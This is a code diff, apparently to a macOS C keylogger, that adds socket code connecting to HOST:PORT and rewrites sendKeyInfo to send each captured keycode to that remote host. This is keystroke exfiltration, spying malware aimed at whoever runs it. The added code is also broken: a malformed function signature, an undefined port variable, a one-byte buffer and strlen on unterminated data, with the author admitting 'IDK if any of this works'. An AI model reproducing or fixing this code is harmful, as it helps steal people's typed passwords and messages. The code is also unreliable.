@@ -12,9 +12,42 @@
 
 #include <ApplicationServices/ApplicationServices.h>
 
+//IDK if any of this works
+int sockfd, portNumber, n;
+struct sockaddr_in serv_addr;
+struct hostent *server;
+
+void error(*char msg) {
+    perror(msg);
+    exit(1);
+}
+
+void setup() {
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    portNumber = atoi(PORT);
+        if (sockfd < 0) {
+        error("ERROR opening socket");
+    }
+    server = gethostbyname(HOST);
+    if (server == NULL) {
+            fprintf(stderr,"ERROR, no such host");
+            exit(0);
+    }
+    memset((char *) &serv_addr, 0,  sizeof(serv_addr));
+    serv_addr.sin_family = AF_INET;
+    memcpy((char *)&serv_addr.sin_addr.s_addr, (char *)server->h_addr, server->h_length);
+    serv_addr.sin_port = htons(portno);
+    if (connect(sockfd,&serv_addr,sizeof(serv_addr)) < 0) {
+            error("ERROR connecting");
+    }
+}
 
 void sendKeyInfo(CGEventType type, CGKeyCode keycode) {
-    ; // Send type << 8 | keycode to HOST:PORT
+    char buffer[1] = type << 8 | keycode;
+	n = write(sockfd,buffer,strlen(buffer));
+    if (n < 0) {
+        error("ERROR writing to socket");
+    }   
 }
 
 
